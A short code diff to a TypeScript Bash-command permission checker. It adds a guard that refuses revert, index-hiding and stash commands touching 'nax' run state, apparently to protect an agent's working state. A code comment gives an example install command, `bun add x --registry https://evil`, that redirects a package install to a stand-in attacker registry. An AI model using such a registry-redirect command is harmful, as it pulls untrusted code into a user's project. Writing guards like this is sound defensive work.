@@ -30,6 +30,7 @@ import type { BashSegment, BashToken } from "#src/permissions/index";
 import { lexBashCommand } from "#src/permissions/index";
 import { cdTargetsFor, nextWorkingDirectories } from "./bash-cwd.ts";
 import { deniedFlag } from "./exec-guard.ts";
+import { anyFrameHasNaxDir, naxStateRefusal } from "./nax-state-guard.ts";
 import type { CompiledEntry, CompiledPattern } from "./policy-match.ts";
 
 export type BashCheck =
@@ -164,6 +165,10 @@ function checkPayload(
   // payload, so `bun add x --registry https://evil` satisfies `bun add *`.
   const flag = deniedFlag(words);
   if (flag !== undefined) return { refusal: deny(`flag ${flag} is not permitted in a Bash command`) };
+
+  // #2490: nax's run state is out of bounds for revert, index-hiding and stash.
+  const stateRefusal = naxStateRefusal(words, anyFrameHasNaxDir(cwd));
+  if (stateRefusal !== undefined) return { refusal: deny(stateRefusal) };
 
   for (const token of segment.tokens) {
     if (token.opaque || hasUnmodelledExpansion(token.text)) {
